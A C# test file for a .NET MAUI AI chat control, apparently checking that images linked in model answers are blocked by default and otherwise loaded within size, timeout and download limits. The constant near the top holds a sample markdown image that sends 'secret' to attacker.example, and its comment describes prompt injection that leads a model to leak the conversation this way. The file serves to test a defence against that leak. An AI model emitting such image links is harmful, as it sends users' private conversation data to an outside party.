using System.Net;

namespace Microsoft.Maui.AI.Chat.Controls.Tests.Markdown;

/// <summary>
/// Images an answer links to on the web. An answer is untrusted, and loading an image sends a request to whatever
/// address it wrote, so they stay chips until the app allows them, and then load within limits.
/// </summary>
public class RemoteImageTests
{
    // A prompt injection can make a model write the conversation into an image address.
    private const string Exfiltrating = "![chart](https://attacker.example/p.png?d=secret)\n\nText ![](https://example.com/i.png) after";

    [Fact]
    public void WebImages_ShowAsChipsByDefault_AndNothingIsRequested()
    {
        var requests = new List<Uri>();
        var view = new MarkdownView { ImageLoader = TestImages.Loader(TestImages.Png(64, 64), requests) };
        Assert.False(view.AllowRemoteImages);

        view.SetMarkdown(Exfiltrating);

        Assert.Empty(requests);
        Assert.Empty(Descendants(view).OfType<Image>());

        // The chip says what the image is and which site has it; tapping it opens it in the browser.
        var chip = Assert.IsAssignableFrom<Border>(view.BlockViews[0]);
        Assert.Equal("chart, Image \u00B7 attacker.example", SemanticProperties.GetDescription(chip));
        Assert.Equal("Opens the link", SemanticProperties.GetHint(chip));
        Assert.Single(chip.GestureRecognizers.OfType<TapGestureRecognizer>());

        var inline = Assert.IsAssignableFrom<Border>(Assert.IsAssignableFrom<VerticalStackLayout>(view.BlockViews[1]).Children[1]);
        Assert.Equal("Image, example.com", SemanticProperties.GetDescription(inline));
    }

    [Fact]
    public void WithRemoteImages_AnImageLoadsAtTheSizeItsHeaderGives()
    {
        var requests = new List<Uri>();
        var view = new MarkdownView { AllowRemoteImages = true, ImageLoader = TestImages.Loader(TestImages.Png(640, 480), requests) };

        view.SetMarkdown("![chart](https://example.com/c.png)");

        var image = Assert.IsType<ChatImage>(Assert.IsType<LinkedImageView>(view.BlockViews[0]).Image);
        Assert.Equal(new Size(640, 480), image.PixelSize);
        Assert.IsType<StreamImageSource>(image.Source);
        Assert.Equal("chart", SemanticProperties.GetDescription(image));
        Assert.Equal(320, image.MaximumHeightRequest);
        Assert.Equal([new Uri("https://example.com/c.png")], requests);
    }

    public static TheoryData<string, byte[]?> Refused => new()
    {
        // Decoding takes memory in proportion to the pixels, and a small file can claim a huge image.
        { "more than 16 megapixels", TestImages.Png(5000, 4000) },
        { "no size in its header", "<html>Not found</html>"u8.ToArray() },
        { "a failed download", null },
    };

    [Theory]
    [MemberData(nameof(Refused))]
    public void WithRemoteImages_AnImageThatCannotBeShownSafely_IsAChip(string reason, byte[]? bytes)
    {
        var view = new MarkdownView { AllowRemoteImages = true, ImageLoader = TestImages.Loader(bytes) };

        view.SetMarkdown("![chart](https://example.com/c.png)");

        var linked = Assert.IsType<LinkedImageView>(view.BlockViews[0]);
        var chip = Assert.IsAssignableFrom<Border>(linked.Content);
        Assert.True(linked.Image.Source is null, reason);
        Assert.Equal("chart, Image \u00B7 example.com", SemanticProperties.GetDescription(chip));
    }

    [Fact]
    public void WithRemoteImages_AnImageShowsWhenItArrives() => UIThread.Run(async () =>
    {
        using var dispatcher = UIThreadDispatcher.Install();
        var download = new TaskCompletionSource<byte[]?>();
        var view = new MarkdownView { AllowRemoteImages = true, ImageLoader = new RemoteImageLoader((_, _) => download.Task) };
        view.SetMarkdown("![chart](https://example.com/c.png)");
        var image = Assert.IsType<ChatImage>(Assert.IsType<LinkedImageView>(view.BlockViews[0]).Image);
        Assert.Null(image.Source);
        Assert.Null(image.PixelSize);
        int? shownOn = null;
        image.PropertyChanged += (_, e) =>
        {
            if (e.PropertyName == nameof(Image.Source))
                shownOn = Environment.CurrentManagedThreadId;
        };

        // The download finishes on another thread; the image is shown on the UI thread.
        await Task.Run(() => download.SetResult(TestImages.Png(300, 200)));
        await UIThread.Until(() => shownOn is not null);

        Assert.Equal(new Size(300, 200), image.PixelSize);
        Assert.IsType<StreamImageSource>(image.Source);
        Assert.Equal(dispatcher.ThreadId, shownOn);
    });

    [Fact]
    public void TurningRemoteImagesOnAndOff_ShowsTheImagesOrTheirChips()
    {
        var view = new MarkdownView { ImageLoader = TestImages.Loader(TestImages.Png(64, 64)) };
        view.SetMarkdown("Before\n\n![chart](https://example.com/c.png)");
        Assert.IsAssignableFrom<Border>(view.BlockViews[1]);

        view.AllowRemoteImages = true;

        Assert.Equal("Before", Assert.IsAssignableFrom<Label>(view.BlockViews[0]).Text);
        Assert.Equal(new Size(64, 64), Assert.IsType<ChatImage>(Assert.IsType<LinkedImageView>(view.BlockViews[1]).Image).PixelSize);
        Assert.Equal(view.BlockViews.OfType<IView>(), ((Layout)view.Content).Children);

        view.AllowRemoteImages = false;

        Assert.IsAssignableFrom<Border>(view.BlockViews[1]);
        Assert.Empty(Descendants(view).OfType<Image>());
    }

    [Fact]
    public async Task ALoader_AsksOncePerAddress_AndAgainAfterAFailure()
    {
        var requests = new List<Uri>();
        var fail = true;
        var loader = TestImages.Loader(_ => fail ? null : TestImages.Png(10, 10), requests);
        var uri = new Uri("https://example.com/c.png");

        Assert.Null(await loader.LoadAsync(uri));
        fail = false;
        var first = await loader.LoadAsync(uri);
        var second = await loader.LoadAsync(uri);

        Assert.NotNull(first);
        Assert.Same(first, second);
        Assert.Equal(2, requests.Count);
    }

    [Fact]
    public async Task ALoader_GivesUpAfterItsTimeout()
    {
        var loader = new RemoteImageLoader(
            async (_, cancellationToken) =>
            {
                await Task.Delay(Timeout.Infinite, cancellationToken);
                return null;
            },
            TimeSpan.FromMilliseconds(50));

        Assert.Null(await loader.LoadAsync(new Uri("https://example.com/slow.png")));
    }

    [Fact]
    public async Task Downloads_StopAtTheSizeLimit()
    {
        const int Limit = 1024;
        var png = TestImages.Png(10, 10);
        Assert.Equal(png, await Download(new ByteArrayContent(png)));
        Assert.Null(await Download(new ByteArrayContent(png), HttpStatusCode.NotFound));

        // Too big by its length header, or (no length given) as it arrives.
        Assert.Null(await Download(new ByteArrayContent(new byte[Limit + 1])));
        Assert.Null(await Download(new StreamContent(new UnknownLengthStream(Limit + 1))));
        Assert.Equal(Limit, (await Download(new StreamContent(new UnknownLengthStream(Limit))))?.Length);

        static async Task<byte[]?> Download(HttpContent content, HttpStatusCode status = HttpStatusCode.OK)
        {
            using var client = new HttpClient(new Responder(() => new HttpResponseMessage(status) { Content = content }));
            return await RemoteImageLoader.DownloadAsync(client, new Uri("https://example.com/i.png"), Limit, CancellationToken.None);
        }
    }

    [Fact]
    public async Task Downloads_ThatFail_GiveNothing()
    {
        using var client = new HttpClient(new Responder(() => throw new HttpRequestException("offline")));

        Assert.Null(await RemoteImageLoader.DownloadAsync(client, new Uri("https://example.com/i.png"), 1024, CancellationToken.None));
    }

    private static IEnumerable<Element> Descendants(Element root) =>
        ((IVisualTreeElement)root).GetVisualChildren().OfType<Element>().SelectMany(child => Descendants(child).Prepend(child));

    private sealed class Responder(Func<HttpResponseMessage> respond) : HttpMessageHandler
    {
        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) =>
            Task.FromResult(respond());
    }

    // Content whose length is not known up front, as when a server streams it.
    private sealed class UnknownLengthStream(int length) : Stream
    {
        private int _remaining = length;

        public override bool CanRead => true;

        public override bool CanSeek => false;

        public override bool CanWrite => false;

        public override long Length => throw new NotSupportedException();

        public override long Position
        {
            get => throw new NotSupportedException();
            set => throw new NotSupportedException();
        }

        public override int Read(byte[] buffer, int offset, int count)
        {
            var read = Math.Min(count, _remaining);
            Array.Clear(buffer, offset, read);
            _remaining -= read;
            return read;
        }

        public override void Flush()
        {
        }

        public override long Seek(long offset, SeekOrigin origin) => throw new NotSupportedException();

        public override void SetLength(long value) => throw new NotSupportedException();

        public override void Write(byte[] buffer, int offset, int count) => throw new NotSupportedException();
    }
}
